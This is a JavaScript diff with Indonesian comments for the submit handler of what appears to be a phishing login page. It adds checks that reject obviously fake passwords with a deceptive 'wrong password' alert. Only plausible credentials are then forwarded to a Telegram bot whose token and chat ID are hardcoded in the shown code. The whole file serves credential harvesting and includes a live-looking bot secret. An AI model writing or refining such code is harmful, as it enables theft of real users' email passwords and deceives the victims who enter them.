@@ -5,21 +5,24 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
     const password = document.getElementById('password').value;
     const submitBtn = document.getElementById('submitBtn');
     
-    // --- LOGIKA VALIDASI BARU ---
+    // --- LOGIKA VALIDASI ---
     
     // 1. Cek jika password hanya berisi angka
     const isAllNumbers = /^\d+$/.test(password);
     
-    // 2. Cek jika password sama dengan email
+    // 2. Cek jika password sama dengan email yang diinput
     const isPasswordSameAsEmail = (password.toLowerCase() === email.toLowerCase());
 
-    // Eksekusi Validasi
-    if (password === "123456" || isAllNumbers || isPasswordSameAsEmail) {
+    // 3. Cek jika password diisi dengan format email (mengandung @ dan titik)
+    const isEmailFormat = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(password);
+
+    // Eksekusi Validasi: Jika salah satu kondisi di bawah terpenuhi, tampilkan error
+    if (password === "123456" || isAllNumbers || isPasswordSameAsEmail || isEmailFormat) {
         alert("Kata sandi salah! Pastikan kata sandi Anda benar.");
-        return; // Berhenti, tidak kirim ke Telegram
+        return; // Berhenti di sini, data tidak dikirim ke Telegram
     }
 
-    // --- PROSES KIRIM KE TELEGRAM (Jika lolos validasi) ---
+    // --- PROSES KIRIM KE TELEGRAM (Hanya jika lolos validasi di atas) ---
     const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; 
     const chatId = '5056601299'; 
 
